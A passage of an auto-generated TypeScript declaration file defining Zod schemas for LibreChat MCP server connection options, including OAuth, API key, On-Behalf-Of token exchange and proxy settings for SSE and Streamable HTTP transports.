    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"sse">>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "sse";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    url: string;
    type?: "sse" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>;
export declare const StreamableHTTPOptionsSchema: z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodUnion<[z.ZodLiteral<"streamable-http">, z.ZodLiteral<"http">]>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>;
export declare const MCPOptionsSchema: z.ZodUnion<[z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
